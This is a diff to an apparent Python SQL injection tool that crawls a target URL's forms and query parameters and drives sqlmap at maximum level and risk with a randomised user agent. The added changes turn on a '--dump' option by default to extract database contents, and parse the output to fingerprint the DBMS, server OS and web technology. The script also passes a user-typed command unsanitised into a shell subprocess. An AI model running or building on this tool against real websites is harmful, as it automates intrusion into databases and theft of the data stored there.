@@ -2,18 +2,19 @@ import subprocess, time, os
 from urllib.parse import urlparse
 from scripts.crawler import *
 from scripts.selenium import *
+from scripts.injection_log import *
 
 injection_found = False
 injection_log = []
 start_time = 0
 detected_info = {"WEB_SERVER": None, "TECHNOLOGY": None, "DBMS": None}
 
-def core(input_url: str, strength: int, threads: bool, flush_session: bool, manual_command: str):
+def core(input_url: str, strength: int, threads: int, flush_session: bool, dump_db: bool, manual_command: str):
     global start_time
     try:
 
         timeout = 10 # Lower -> Fast, less accurate. Higher -> Slow, more accurate
-        threads = 10 if threads else threads = 1
+        """threads = 10 if threads else 1"""
 
         if not input_url:
             print("Enter a valid URL")
@@ -36,17 +37,21 @@ def core(input_url: str, strength: int, threads: bool, flush_session: bool, manu
 
         print(f"URL given: {input_url}")
         start_time = time.time() 
-        process_targets(input_url, level, risk, threads, timeout, flush_session, manual_command)
+        process_targets(input_url, level, risk, threads, timeout, flush_session, dump_db, manual_command)
 
     except ValueError:
         print("Invalid input")
 
-def process_targets(input_url, level, risk, threads, timeout, flush_session, manual_command):
+def process_targets(input_url, level, risk, threads, timeout, flush_session, dump_db, manual_command):
     global injection_found
     global start_time
+    global injection_log
 
     print(f"\nCrawling and analyzing {input_url} for vulnerabilities...")
     found_urls = crawler(input_url)
+
+    if dump_db:
+        manual_command += " --dump "
 
     if not found_urls["forms"] and not found_urls["queries"]:
         print("No vulnerable forms or query parameters found.\n Trying default crawl...")
@@ -85,11 +90,13 @@ def process_targets(input_url, level, risk, threads, timeout, flush_session, man
     minutes, seconds = divmod(int(elapsed_time), 60)
 
     if injection_log:
+        injection_log = simplify_payload(injection_log) 
 
+        if detected_info: injection_log.append(f"\n=== Extracted Server Information ===\n")
         if detected_info["WEB_SERVER"]: injection_log.append(f"Web Server OS: {detected_info["WEB_SERVER"]}")
         if detected_info["TECHNOLOGY"]: injection_log.append(f"Web App Tech: {detected_info["TECHNOLOGY"]}")
         if detected_info["DBMS"]: injection_log.append(f"DBMS Type: {detected_info["DBMS"]}")
-        injection_log.append(f"Total scan time: {minutes} minutes {seconds} seconds.")
+        injection_log.append(f"\nTotal scan time: {minutes} minutes {seconds} seconds.")
 
         print("\n==== Vulnerability Found ====\n")
         print("\n".join(injection_log))
@@ -111,11 +118,11 @@ def run_sqlmap(url, form, smart, level=5, risk=3, threads=10, referer="", cookie
     referer = referer or url
 
     if os.name == 'nt':  # Windows
-        pythonunbuffered = "set PYTHONUNBUFFERED=1 &&"
+        python_unbuffered = "set PYTHONUNBUFFERED=1 &&"
     else:  # Linux/Mac
-        pythonunbuffered = "PYTHONUNBUFFERED=1"
+        python_unbuffered = "PYTHONUNBUFFERED=1"
 
-    command = f"{pythonunbuffered} sqlmap {flush_session} -u \"{url}\" {manual} {form} \
+    command = f"{python_unbuffered} sqlmap {flush_session} -u \"{url}\" {manual} {form} \
             --level={level} --risk={risk} --threads={threads} {smart} \
             -v {verbosity} --random-agent --headers=\"Referer: {referer}; \
             Accept-Language: en-US,en;q=0.9\" {cookie} {csrf} \
@@ -127,6 +134,7 @@ def run_sqlmap(url, form, smart, level=5, risk=3, threads=10, referer="", cookie
     capturing = False
     second_hyphens = False
     suppress_output = False
+    potential_DBMS = ""
 
     with subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1) as process:
         for line in iter(process.stdout.readline, ''):
@@ -149,16 +157,20 @@ def run_sqlmap(url, form, smart, level=5, risk=3, threads=10, referer="", cookie
                 else:
                     injection_log.append(line.strip())
 
-            if "identified the following injection" in line:
+            if any(keyword in line for keyword in ["identified the following injection", "resumed the following injection point(s)"]): 
                 capturing = True
 
-            if "web server operating system" in line:
+            if "back-end DBMS could be " in line:
+                potential_DBMS = line.split("back-end DBMS could be '")[1].split("'")[0]
+            elif "web server operating system" in line:
                 detected_info["WEB_SERVER"] = line.split(": ", 1)[1].strip() if ": " in line else line.strip()
-            if "web application technology" in line:
+            elif "web application technology" in line:
                 detected_info["TECHNOLOGY"] = line.split(": ", 1)[1].strip() if ": " in line else line.strip()
-            if "back-end dbms" in line:
+            elif "back-end dbms" in line:
                 detected_info["DBMS"] = line.split(": ", 1)[1].strip() if ": " in line else line.strip()
-
+            elif "the back-end DBMS is" in line:
+                detected_info["DBMS"] = line.split("the back-end DBMS is", 1)[1].strip()
+    
         process.stdout.close()
         process.wait()
 
@@ -174,7 +186,8 @@ if __name__ == "__main__":
     input_url = input("Enter Target URL: ").strip()
     strength = 3
     threads = 10
-    flush_session = True
+    flush_session = False
+    dump_db = True
     manual_command = input("Enter manual command: ")
-    core(input_url, strength, threads, flush_session,manual_command)
+    core(input_url, strength, threads, flush_session, dump_db, manual_command)
 
